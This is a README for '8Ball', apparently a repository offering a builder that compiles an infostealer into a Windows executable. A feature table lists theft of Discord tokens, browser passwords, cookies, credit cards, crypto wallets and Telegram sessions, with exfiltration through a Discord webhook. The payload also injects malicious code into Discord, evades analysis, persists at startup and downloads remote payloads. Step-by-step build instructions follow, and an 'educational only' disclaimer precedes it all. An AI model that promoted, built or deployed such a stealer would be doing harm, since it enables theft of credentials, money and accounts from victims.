# 8Ball [ALPHA]

> **DISCLAIMER:** This software is provided for educational and research purposes only. The author is not responsible for any misuse, damage, or illegal activity resulting from the use of this software. Users assume full responsibility for their actions. Unauthorized access to computer systems and data theft are illegal and punishable by law.

8Ball is a **payload builder** that compiles a data-collection module (`rx.py`) into a standalone Windows executable using PyInstaller.

## Features

The builder GUI (`builder.pyw`) lets you configure which modules to include:

| Feature | Description |
|---|---|
| **Discord Token Stealer** | Steals Discord authentication tokens from local storage |
| **Browser Data Extractor** | Decrypts saved passwords from 20+ Chromium browsers (Chrome, Opera, Brave, Edge, Yandex, etc.) |
| **Cookies** | Steals browser cookies from the same browsers |
| **Autofill / History / Bookmarks** | Exfiltrates autofill entries, browsing history, and bookmarks |
| **Credit Cards** | Steals saved credit card numbers from browser storage |
| **Discord JS Injection** | Injects malicious code into Discord's `index.js` |
| **Anti-Debug / Anti-VM** | Kills debuggers, checks blacklisted IPs, detects VMware/VirtualBox |
| **IP & Location** | Geo-locates the victim via ip-api.com |
| **Nitro / Badges / Billing** | Fetches Discord nitro status, badge info, and saved payment methods |
| **Discord Gift Codes** | Scrapes unused Discord gift codes from the victim's account |
| **Crypto Wallets** | Searches for cryptocurrency wallet data |
| **Telegram** | Exfiltrates Telegram desktop session data |
| **Startup Persistence** | Adds itself to Windows startup for re-execution on boot |
| **Remote Stub** | Downloads and executes additional payloads from a remote URL |

All collected data is exfiltrated via Discord webhook (and optionally Telegram).

## Installation

1. Install Python 3.x
2. Run `install.bat` or manually install dependencies:

```bash
pip install -r "8Ball [ALPHA]/requirements.txt"
```

## Usage

Run the builder GUI:

```bash
python "8Ball [ALPHA]/builder.pyw"
```

1. Paste a Discord webhook URL
2. Select desired features
3. (Optional) Configure Telegram alerts
4. Click **Generate Payload**
5. A compiled `.exe` is produced in `Build_Project/dist/`

## License

MIT License — see `8Ball [ALPHA]/LICENSE`.


[ABOUT ME](https://guns.lol/ricksanchez./)

[discord.gg/RRgdghWu](https://discord.gg/RRssgdghWu)
